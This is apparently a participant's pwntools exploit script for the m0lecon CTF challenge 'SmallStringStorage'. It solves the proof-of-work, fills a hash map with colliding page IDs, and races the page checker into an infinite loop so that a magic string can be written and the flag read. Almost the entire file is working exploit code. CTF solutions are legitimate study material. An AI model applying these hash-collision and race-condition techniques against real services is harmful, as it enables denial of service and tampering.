#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host s3.challs.m0lecon.it --port 8465 SmallStringStorage.jar
from pwn import *
import random
import time
import ijson


exe = 'SmallStringStorage/SmallStringStorage.jar'

host = args.HOST or 's3.challs.m0lecon.it'
port = int(args.PORT or 8465)

import hashlib

def find_hash_ending_with(suffix, prefix):
    while True:
        # Generate a random string with a fixed prefix
        rest = ''.join(random.choices(string.ascii_lowercase, k=20))
        message = bytes(prefix, 'utf-8') + bytes(rest, 'utf-8')

        # Compute the SHA256 hash of the string
        hash_value = hashlib.sha256(message).hexdigest()

        # Check if the hash ends with the desired suffix
        if hash_value.endswith(suffix):
            return message.decode()


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process(["java", "-jar", exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)

    log.info("Hash")
    hash_str = io.recv().decode()
    match = re.search(r'starting with (\w+) such that.*ends in (\w+)\.', hash_str)
    if match:
        start = match.group(1)
        end = match.group(2)
    print(hash_str, start, end)
    hash = find_hash_ending_with(start, end)
    io.send(bytes(hash, 'utf-8'))

    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


class mainMenu():

    @staticmethod
    def create_new_page(page: int):
        io.sendlineafter(b"> ", b"1") # 1. Create new page
        io.sendlineafter(b"> ", bytes(f"{page}", 'utf-8')) # Give me a numerical identifier for the page:

    @staticmethod
    def edit_page(page: int):
        io.sendlineafter(b"> ", b"2")  # 2. Edit page
        io.sendlineafter(b"> ", bytes(f"{page}", 'utf-8')) # Give me a numerical identifier for the page:

    @staticmethod
    def unload_page(page: int):
        io.sendlineafter(b"> ", b"3")  # 2. Edit page
        io.sendlineafter(b"> ", bytes(f"{page}", 'utf-8')) # Give me a numerical identifier for the page:

    @staticmethod
    def store_backed():
        io.sendlineafter(b"> ", b"4") # 4. Write all memory storage to backend

    @staticmethod
    def check_page(page: int):
        io.sendlineafter(b"> ", b"5") # 5. Check page for targe
        io.sendlineafter(b"> ", bytes(f"{page}", 'utf-8')) # Give me the numerical identifier for the page:
        return io.recv()

class pageMenu():

    @staticmethod
    def add_element():
        io.sendlineafter(b"> ", b"2") # 2. Add element to page

    @staticmethod
    def show_element(element: int) -> bytes:
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", bytes(f"{element}", 'utf-8'))

    @staticmethod
    def edit_element(element: int):
        io.sendlineafter(b"> ", b"4") # 4. Edit element in page
        io.sendlineafter(b"> ", bytes(f"{element}", 'utf-8')) # Which index do you want to edit?

    @staticmethod
    def ret():
        io.sendlineafter(b"> ", b"6")  # Return menu


class stringsMenu():

    @staticmethod
    def edit_generator(idx: int):
        io.sendlineafter(b"> ", b"1") # Edit generator index
        io.sendlineafter(b"> ", bytes(f"{idx}", 'utf-8')) # Which index do you want to edit
    
    @staticmethod
    def char(c: str):
        io.sendlineafter(b"> ", b"1")  # 1. CHARACTER"
        io.sendlineafter(b"> ", bytes(f"{c}", 'utf-8'))  # What character do you want to set?
    
    @staticmethod
    def jump(jmp_idx: int):
        io.sendlineafter(b"> ", b"2")  # 2. JUMP
        io.sendlineafter(b"> ", bytes(f"{jmp_idx}", 'utf-8'))  # Where do you want to jump?

    @staticmethod
    def end():
        io.sendlineafter(b"> ", b"3")  # 3. END

    @staticmethod
    def ret():
        io.sendlineafter(b"> ", b"2")  # Return page menu

def load_list_from_json(json_file, key):
    with open(json_file, 'rb') as file:
        parser = ijson.parse(file)
        current_key = ''
        loading_target_list = False
        target_list = []

        for prefix, event, value in parser:
            if event == 'map_key':
                current_key = value
                if current_key == key:
                    loading_target_list = True
                else:
                    loading_target_list = False
            elif loading_target_list and event == 'start_array':
                target_list = []
            elif loading_target_list and event == 'number':
                target_list.append(value)

        return target_list


#############################################################################################
#############################################################################################
#############################################################################################

def build():

    with log.progress(f"Building map with target page {last_page}") as build_log:

        build_log.status(f"Creating {pages} pages")

        for page in collisions[:pages]:
            page = int(page)

            mainMenu.create_new_page(page)

            if page == last_page:
                mainMenu.edit_page(page)
        
                pageMenu.add_element()
                pageMenu.edit_element(0)

                # add first element of magic
                stringsMenu.edit_generator(0)
                stringsMenu.char(magic[0])       
            
                # intermediate jump
                stringsMenu.edit_generator(1)
                stringsMenu.jump(2)

                # infinite loop
                stringsMenu.edit_generator(2)
                stringsMenu.jump(3)

                stringsMenu.edit_generator(3)
                stringsMenu.jump(2)

                # return
                stringsMenu.ret()
                pageMenu.ret()

        build_log.status("Backing up")
        mainMenu.store_backed()

        # Create a large target (largest) page with multiple elements 
        # so it takes some time to iterate them all increasing our window
        build_log.status(f"Adding {last_page_elem_count} elements to page: {last_page}")

        mainMenu.edit_page(last_page)
        for i in range(last_page_elem_count):
            pageMenu.add_element()

        pageMenu.ret()
        io.recvuntil(b"> ")

        build_log.success("Done")


def probe(ms: int, remove_count: int):

    success = b"loading"
    fail = b"finished"
    checker_fail = b"Only"

    wait = 0 if ms == 0 else (ms / 1000)
    assert(remove_count < pages-2)
    # to_del = collisions[:pages][-remove_count-remove_count:-remove_count]
    to_del = collisions[:pages][-remove_count:-2]
    to_del.reverse()

    # Start the checker on our last page
    io.sendline(b"5") 
    io.sendline(bytes(f"{last_page}", 'utf-8'))
    time.sleep(wait)

    # Sent a large amount of removes
    for col in to_del:
    
        io.sendline(b"3") 
        io.sendline(bytes(f"{int(col)}", 'utf-8'))


    res = io.recvuntil((success, fail, checker_fail))
    if fail in res or checker_fail in res:
        log.failure(f"Checker NOT stuck.. Failed: {fail in res}, Too fast: {checker_fail in res}")
        return False

    if success in res:
        log.success(f"Checker stuck! {ms}s")
        return True


    # Catch if missed
    # io.sendline(b"5")
    # io.sendline(bytes(f"{last_page}", 'utf-8'))
    # res = io.recvuntil((success, checker_fail, fail))

    # if success in res or checker_fail in res:
    #     log.success("Checker maybe stuck!")
    #     return True



def write_secret(page: int, data: str):
    io.sendline(b"")
    mainMenu.edit_page(page)
    pageMenu.edit_element(0)
    for d in data:
        log.success(f"Append: {d}")

        stringsMenu.edit_generator(0)
        stringsMenu.char(d)
        time.sleep(1)

        stringsMenu.edit_generator(1) # block 1 to only go to itself and unlock later
        stringsMenu.jump(1)
        time.sleep(1)

        stringsMenu.edit_generator(2) # use 2 to jump to 0 so string is written
        stringsMenu.jump(0)

        # Now the new char should have been written and we are stuck in 1<->1 jumps
        time.sleep(2) # just to be sure the string was written

        stringsMenu.edit_generator(2) # restore 2<->3 infinite loop 
        stringsMenu.jump(3)
        time.sleep(1)
        stringsMenu.edit_generator(1) # open path to infinite loop 1->2
        stringsMenu.jump(2)
        time.sleep(1)


    stringsMenu.edit_generator(3)
    stringsMenu.jump(6) # break out of infinite loop

    stringsMenu.ret()
    pageMenu.ret()

    time.sleep(1)
    
    flag = mainMenu.check_page(last_page).decode()
    log.success(flag)
    io.interactive()

pty = process.PTY
io = start(stdin=pty, stdout=pty)

target_page_idx = "3876"  # I know this one has many collisions
collisions: list[int] = []
with log.progress('Init') as init_log:
    init_log.status('Loading `collisions.json` (this might take a few seconds)')
    collisions: list[int] = load_list_from_json('collisions.json', target_page_idx)
    init_log.success(f"Loaded {len(collisions)} collisions for hash {int(target_page_idx)}")

magic = "i swear it's possible!"
map_size = math.floor(8192 * 0.9)  # Will be aligned to 8192 if you give more a larger power of 2 will be created
pages = map_size - 10 # Number of pages to create

last_page = collisions[:pages][-1]
last_page_elem_count = 50000

io.sendlineafter(b"> ", bytes(f"{map_size}", 'utf-8')) # size of memory
log.info(f"Requesting map of size {map_size}")

advance = 100
rep = 0

while True:
    for p in range(0, 501, advance):
        
        build()
        rem = 1000
        log.info(f"Probing {p}ms by removing {rem} pages")
        fuck_yea = probe(p, rem)
        if fuck_yea:
            # pass
            io.clean()
            write_secret(last_page, magic[1:])

        io.clean()
        io.sendline(b"") # Recalibrate

        # clean all pages to start a fresh map
        log.info("Cleaning up")
        for n in collisions[:pages]:
            mainMenu.unload_page(n)
    
    rep += 1
    if rep >= 2:
        advance = int(advance / 2)
        if advance < 10:
            advance = 100
